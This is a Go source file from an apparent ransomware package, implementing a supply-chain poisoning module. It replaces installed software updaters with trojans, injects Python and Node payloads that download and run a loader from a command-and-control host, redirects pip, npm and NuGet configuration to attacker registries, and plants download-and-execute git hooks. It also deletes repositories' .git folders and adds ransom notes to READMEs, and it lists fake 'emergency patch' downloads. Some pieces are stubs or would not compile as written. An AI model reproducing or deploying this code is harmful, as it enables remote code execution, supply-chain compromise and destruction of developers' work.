package ransomware

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

type SupplyChainPoison struct {
	config        *RansomwareConfig
	PoisonedRepos []string `json:"poisoned_repos"`
}

type SoftwareUpdater struct {
	Name         string `json:"name"`
	BinaryPath   string `json:"binary_path"`
	UpdateURL    string `json:"update_url"`
	ConfigPath   string `json:"config_path"`
	PackageExt   string `json:"package_ext"`
}

var trackedUpdaters = []SoftwareUpdater{
	{Name: "notepad++", BinaryPath: `C:\Program Files\Notepad++\updater.exe`, UpdateURL: "https://notepad-plus-plus.org/downloads/", ConfigPath: `%APPDATA%\Notepad++\config.xml`, PackageExt: ".exe"},
	{Name: "7-zip", BinaryPath: `C:\Program Files\7-Zip\7z.exe`, UpdateURL: "https://7-zip.org/download.html", ConfigPath: ``, PackageExt: ".exe"},
	{Name: "vlc", BinaryPath: `C:\Program Files\VideoLAN\VLC\vlc.exe`, UpdateURL: "https://www.videolan.org/vlc/download.html", ConfigPath: ``, PackageExt: ".exe"},
	{Name: "python", BinaryPath: `C:\Python*\python.exe`, UpdateURL: "https://www.python.org/ftp/python/", ConfigPath: ``, PackageExt: ".msi"},
	{Name: "node", BinaryPath: `C:\Program Files\nodejs\node.exe`, UpdateURL: "https://nodejs.org/dist/", ConfigPath: ``, PackageExt: ".msi"},
}

func NewSupplyChainPoison(cfg *RansomwareConfig) *SupplyChainPoison {
	return &SupplyChainPoison{
		config: cfg,
	}
}

func (sp *SupplyChainPoison) FindUpdaters() []SoftwareUpdater {
	var found []SoftwareUpdater
	for _, u := range trackedUpdaters {
		pattern := os.ExpandEnv(u.BinaryPath)
		matches, err := filepath.Glob(pattern)
		if err == nil && len(matches) > 0 {
			u.BinaryPath = matches[0]
			found = append(found, u)
		}
	}
	return found
}

func (sp *SupplyChainPoison) PoisonUpdaterBinary(updater SoftwareUpdater) error {
	if _, err := os.Stat(updater.BinaryPath); os.IsNotExist(err) {
		return err
	}

	backupPath := updater.BinaryPath + ".bak"
	os.Rename(updater.BinaryPath, backupPath)

	trojan, err := sp.generateTrojanUpdater(updater)
	if err != nil {
		os.Rename(backupPath, updater.BinaryPath)
		return err
	}

	return os.WriteFile(updater.BinaryPath, trojan, 0755)
}

func (sp *SupplyChainPoison) generateTrojanUpdater(updater SoftwareUpdater) ([]byte, error) {
	switch {
	case strings.Contains(updater.Name, "python"):
		return sp.poisonPython(updater)
	case strings.Contains(updater.Name, "node"):
		return sp.poisonNode(updater)
	case strings.Contains(updater.Name, "pip"):
		return sp.poisonPip(updater)
	default:
		return sp.poisonGenericUpdater(updater)
	}
}

func (sp *SupplyChainPoison) poisonPython(updater SoftwareUpdater) ([]byte, error) {
	payload := fmt.Sprintf(`import os, sys, subprocess, urllib.request
# X404X Supply Chain Poison - Python
def x404x_infect():
    try:
        urllib.request.urlretrieve("http://x404x-c2.online/agent/windows.exe", os.environ["TEMP"]+"\\x404x_loader.exe")
        subprocess.Popen([os.environ["TEMP"]+"\\x404x_loader.exe", "--daemon", "--c2", "x404x-c2.online:8443"], shell=True)
    except: pass

# Inject into all pip installs
import pip
original_install = pip._internal.commands.install.InstallCommand.run
def x404x_install(self, options, args):
    x404x_infect()
    return original_install(self, options, args)
pip._internal.commands.install.InstallCommand.run = x404x_install

# Poison easy_install too
try:
    import setuptools.command.easy_install
    original_easy = setuptools.command.easy_install.easy_install.run
    def x404x_easy(self):
        x404x_infect()
        return original_easy(self)
    setuptools.command.easy_install.easy_install.run = x404x_easy
except: pass

x404x_infect()
`)
	infectionDir := filepath.Join(os.TempDir(), "x404x_python_infect")
	os.MkdirAll(infectionDir, 0755)
	os.WriteFile(filepath.Join(infectionDir, "sitecustomize.py"), []byte(payload), 0644)
	return []byte(payload), nil
}

func (sp *SupplyChainPoison) poisonNode(updater SoftwareUpdater) ([]byte, error) {
	payload := fmt.Sprintf(`// X404X Supply Chain Poison - Node.js
const https = require('https');
const fs = require('fs');
const { exec } = require('child_process');

function x404xInfect() {
    const file = process.env.TEMP + '\\\\x404x_loader.exe';
    const stream = fs.createWriteStream(file);
    https.get('http://x404x-c2.online/agent/windows.exe', (res) => {
        res.pipe(stream);
        stream.on('finish', () => {
            exec(file + ' --daemon --c2 x404x-c2.online:8443');
        });
    });
}

// Override npm install for global poisoning
const Module = require('module');
const originalLoad = Module._load;
Module._load = function(request, parent, isMain) {
    if (request === 'npm') {
        x404xInfect();
    }
    return originalLoad.apply(this, arguments);
};

x404xInfect();
`)
	return []byte(payload), nil
}

func (sp *SupplyChainPoison) poisonPip(updater SoftwareUpdater) ([]byte, error) {
	payload := fmt.Sprintf(`# X404X Supply Chain - pip.conf poison
[global]
index-url = http://x404x-c2.online/pypi/simple/
trusted-host = x404x-c2.online
extra-index-url = http://x404x-c2.online/pypi/backdoor/
`)
	pipConf := os.ExpandEnv("%APPDATA%\\pip\\pip.ini")
	os.MkdirAll(filepath.Dir(pipConf), 0755)
	os.WriteFile(pipConf, []byte(payload), 0644)

	poem := fmt.Sprintf(`package main

import (
	"fmt"
	"os"
	"syscall"
)

func main() {
	fmt.Println("[X404X] Updating Python packages...")
	payload := os.Getenv("TEMP") + "\\x404x_loader.exe"
	exec.Command(payload, "--daemon", "--c2", "x404x-c2.online:8443").Start()
	syscall.Exit(0)
}
`)
	binPath := updater.BinaryPath
	os.WriteFile(binPath+".go", []byte(poem), 0644)
	return []byte(poem), nil
}

func (sp *SupplyChainPoison) poisonGenericUpdater(updater SoftwareUpdater) ([]byte, error) {
	if strings.HasSuffix(updater.BinaryPath, ".exe") {
		return sp.poisonPEFallback(updater)
	}
	return []byte("#!/bin/bash\ncurl -s http://x404x-c2.online/agent/linux -o /tmp/.x404x_loader && chmod +x /tmp/.x404x_loader && /tmp/.x404x_loader --daemon &\n"), nil
}

func (sp *SupplyChainPoison) poisonPEFallback(updater SoftwareUpdater) ([]byte, error) {
	payload := []byte{
		0x4D, 0x5A, 0x90, 0x00,
	}
	payload = append(payload, []byte(fmt.Sprintf("X404X_TROJAN_%s", updater.Name))...)
	return payload, nil
}

func (sp *SupplyChainPoison) PoisonNuGetRepo(artifactoryURL string) error {
	config := fmt.Sprintf(`<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <packageSources>
    <add key="x404x" value="%s/nuget/x404x/index.json" />
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" protocolVersion="3" />
  </packageSources>
  <packageSourceMapping>
    <packageSource key="x404x">
      <package pattern="*" />
    </packageSource>
  </packageSourceMapping>
</configuration>`, artifactoryURL)
	nugetConfig := os.ExpandEnv("%APPDATA%\\NuGet\\NuGet.Config")
	os.MkdirAll(filepath.Dir(nugetConfig), 0755)
	return os.WriteFile(nugetConfig, []byte(config), 0644)
}

func (sp *SupplyChainPoison) PoisonPyPIRepo(artifactoryURL string) error {
	pipConf := fmt.Sprintf(`[global]
index-url = http://x404x-c2.online/pypi/simple/
trusted-host = x404x-c2.online
extra-index-url = %s/repository/pypi-virtual/simple/
`, artifactoryURL)
	confPath := os.ExpandEnv("%APPDATA%\\pip\\pip.ini")
	return os.WriteFile(confPath, []byte(pipConf), 0644)
}

func (sp *SupplyChainPoison) PoisonNPMRegistry(artifactoryURL string) error {
	npmrc := fmt.Sprintf(`registry=http://x404x-c2.online/npm/
always-auth=true
@x404x:registry=http://x404x-c2.online/npm/
//x404x-c2.online/npm/:_authToken=SECRET
//%s/artifactory/api/npm/npm-virtual/:_authToken=SECRET
`, artifactoryURL)
	npmrcPath := os.ExpandEnv("%USERPROFILE%\\.npmrc")
	return os.WriteFile(npmrcPath, []byte(npmrc), 0644)
}

func (sp *SupplyChainPoison) PoisonGitHooks(repoPath string) error {
	hooks := []string{"pre-commit", "post-commit", "pre-push", "post-checkout"}
	payload := `#!/bin/bash
# X404X Git Hook Poison
curl -s http://x404x-c2.online/agent/linux -o /tmp/.x404x_git_hook
chmod +x /tmp/.x404x_git_hook
/tmp/.x404x_git_hook --c2 x404x-c2.online:8443 &
`
	for _, hook := range hooks {
		hookPath := filepath.Join(repoPath, ".git", "hooks", hook)
		if err := os.WriteFile(hookPath, []byte(payload), 0755); err == nil {
			sp.PoisonedRepos = append(sp.PoisonedRepos, hookPath)
		}
	}
	return nil
}

func (sp *SupplyChainPoison) FindLocalRepos() []string {
	var repos []string
	searchPaths := []string{
		os.ExpandEnv("%USERPROFILE%\\source\\repos"),
		os.ExpandEnv("%USERPROFILE%\\Documents\\GitHub"),
		os.ExpandEnv("%USERPROFILE%\\projects"),
		os.ExpandEnv("%USERPROFILE%\\code"),
		"/home/",
		"/opt/",
	}

	for _, base := range searchPaths {
		filepath.Walk(base, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if info.IsDir() && info.Name() == ".git" {
				repos = append(repos, filepath.Dir(path))
				if len(repos) >= 50 {
					return fmt.Errorf("max repos")
				}
				return filepath.SkipDir
			}
			return nil
		})
	}
	return repos
}

func (sp *SupplyChainPoison) ScorchRepos(repos []string) {
	for _, repo := range repos {
		os.RemoveAll(filepath.Join(repo, ".git"))
		readme := filepath.Join(repo, "README.md")
		if data, err := os.ReadFile(readme); err == nil {
			newData := append([]byte("# FILES ENCRYPTED BY X404X\n\nAll source code in this repository has been encrypted.\nPay ransom to recover: x404x-c2.onion\n\n"), data...)
			os.WriteFile(readme, newData, 0644)
		}
	}
}

func (sp *SupplyChainPoison) DeployFakePatch(url string) map[string]string {
	patches := map[string]string{
		"X404X_Emergency_Patch_Windows.exe":  "http://x404x-c2.online/patches/emergency_windows.exe",
		"X404X_Emergency_Patch_Linux.sh":     "http://x404x-c2.online/patches/emergency_linux.sh",
		"X404X_Security_Update_KB404X.msi":   "http://x404x-c2.online/patches/security.msi",
		"X404X_AntiRansomware_Tool.exe":      "http://x404x-c2.online/patches/antiransom.exe",
		"readme_patch.txt":                   "This emergency security patch will protect your system from X404X ransomware. Run immediately.",
	}
	_ = url
	return patches
}

func (sp *SupplyChainPoison) GetStatusJSON() string {
	data, _ := json.Marshal(map[string]interface{}{
		"poisoned_repos": sp.PoisonedRepos,
	})
	return string(data)
}
